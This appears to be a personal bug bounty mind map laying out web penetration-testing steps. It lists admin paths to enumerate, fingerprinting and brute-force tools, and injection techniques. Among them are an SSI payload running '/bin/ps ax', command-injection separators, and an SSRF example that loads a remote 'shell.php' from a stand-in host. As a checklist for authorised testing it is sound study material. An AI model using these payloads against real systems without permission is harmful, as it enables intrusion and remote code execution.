# Bug_Hunt_MAP
My Bug bounty mind map


Penetration Testing Techniques
    |
    +-- Identify Application Entry Points --> Zap, BURP
    |
    +-- Fingerprint Web Server --> Netcraft, Nmap, Nikto
    |
    +-- Review Webserver Metafiles for Information Leakage
    |       |
    |       +-- robots.txt
    |       +-- sitemap.xml
    |       +-- security.txt
    |       +-- humans.txt
    |       +-- .well-knowns
    |
    +-- Fingerprint Web Application Framework --> whatweb, wappalyzer
    |
    +-- Review Old Backup and Unreferenced Files for Sensitive Information --> nessus, wordlists
    |
    +-- Enumerate Infrastructure and Application Admin Interfaces
    |       |
    |       +-- PHP
    |       |       |
    |       |       +-- /phpinfo
    |       |       +-- /phpmyadmin/
    |       |       +-- /phpMyAdmin/
    |       |       +-- /mysqladmin/
    |       |       +-- /MySQLadmin
    |       |       +-- /MySQLAdmin
    |       |       +-- /login.php
    |       |       +-- /logon.php
    |       |       +-- /xmlrpc.php
    |       |       +-- /dbadmin
    |       |
    |       +-- WordPress
    |       |       |
    |       |       +-- wp-admin/
    |       |       +-- wp-admin/about.php
    |       |       +-- wp-admin/admin-ajax.php
    |       |       +-- wp-admin/admin-db.php
    |       |       +-- wp-admin/admin-footer.php
    |       |       +-- wp-admin/admin-functions.php
    |       |       +-- wp-admin/admin-header.php
    |       |
    |       +-- Joomla
    |       |       |
    |       |       +-- /administrator/index.php
    |       |       +-- /administrator/index.php?option=com_login
    |       |       +-- /administrator/index.php?option=com_content
    |       |       +-- /administrator/index.php?option=com_users
    |       |       +-- /administrator/index.php?option=com_menus
    |       |       +-- /administrator/index.php?option=com_installer
    |       |       +-- /administrator/index.php?option=com_config
    |       |
    |       +-- Tomcat
    |       |       |
    |       |       +-- /manager/html
    |       |       +-- /host-manager/html
    |       |       +-- /manager/text
    |       |       +-- /tomcat-users.xml
    |       |
    |       +-- Apache
    |       |       |
    |       |       +-- /index.html
    |       |       +-- /httpd.conf
    |       |       +-- /apache2.conf
    |       |       +-- /server-status
    |       |
    |       +-- Nginx
    |               |
    |               +-- /index.html
    |               +-- /index.htm
    |               +-- /index.php
    |               +-- /nginx_status
    |               +-- /index.php
    |               +-- /nginx.conf
    |               +-- /html/error
    |
    +-- Tools --> Netsparker, Zap
    |
    +-- HTTP Methods
    |       |
    |       +-- Nmap http-methods NSE script, curl
    |       +-- GET, HEAD, POST, DELETE, CONNECT, OPTIONS, TRACE, PATCH
    |
    +-- Test for Subdomain Takeover --> recon-ng, dig, dnsrecon
    |
    +-- Testing for Content Security Policy --> CSP Auditor - Burp Suite Extension
    |
    +-- Authentication Testing
    |       |
    |       +-- Testing for Default Credentials --> hydra, burp intruder
    |       +-- Testing for Bypassing Authentication Schema --> injections
    |       +-- Testing for Vulnerable Remember Password --> MFA --> clickjacking, CSRF
    |       +-- Testing for Weak Password Policy --> check for weak passwords
    |
    +-- Testing for Session Hijacking --> JHijack tool (https://sourceforge.net/projects/jhijack/)
    |
    +-- Injections
    |       |
    |       +-- XML, SQL, SSI, XPath Injection, Server-Side Includes(SSI)
    |               |
    |               +-- GET / HTTP/1.1, Host: www.example.com, Referer: <!--#exec cmd="/bin/ps ax"-->
    |               +-- XPath Injection
    |                       |
    |                       +-- http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1
    |                               |
    |                               +-- Assign a null value to the parameter:
    |                               |       |
    |                               |       +-- http://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1
    |                               |
    |                               +-- Substitute the value with a random value:
    |                               |       |
    |                               |       +-- http://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1
    |                               |
    |                               +-- Add other values to the parameter:
    |                               |       |
    |                               |       +-- http://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1
    |                               |
    |                               +-- Add non-standard special characters:
    |                               |       |
    |                               |       +-- http://<webmail>/src/read_body.php?mailbox=INBOX"&passed_id=46106&startMessage=1
    |                               |
    |                               +-- Eliminate the parameter:
    |                                       |
    |                                       +-- http://<webmail>/src/read_body.php?passed_id=46106&startMessage=1
    |
    +-- Command Injection
    |       |
    |       +-- The following special characters can be used for command injection:
    |               |
    |               +-- cmd1|cmd2
    |               +-- cmd1;cmd2
    |               +-- cmd1||cmd2
    |               +-- cmd1&&cmd2
    |               +-- $(cmd)
    |               +-- cmd
    |               +-- >(cmd)
    |               +-- <(cmd)
    |
    +-- Java
    |       |
    |       +-- Runtime.exec()
    |
    +-- C/C++
    |       |
    |       +-- system
    |       +-- exec
    |       +-- ShellExecute
    |
    +-- Python
    |       |
    |       +-- exec
    |       +-- eval
    |       +-- os.system
    |       +-- os.popen
    |       +-- subprocess.popen
    |       +-- subprocess.call
    |
    +-- PHP
    |       |
    |       +-- system
    |       +-- shell_exec
    |       +-- exec
    |       +-- proc_open
    |       +-- eval
    |
    +-- Testing for HTTP Splitting Smuggling
    |       |
    |       +-- The headers that are the most likely candidates for this attack are:
    |               |
    |               +-- Location
    |               +-- Set-Cookie
    |
    +-- Testing for Host Header Injection
            |
            +-- X-Forwarded Host Header Bypass
            +-- SSRF
                    |
                    +-- GET https://example.com/page?page=about.php
                    +-- GET https://example.com/page?page=https://xxx.com/shell.php
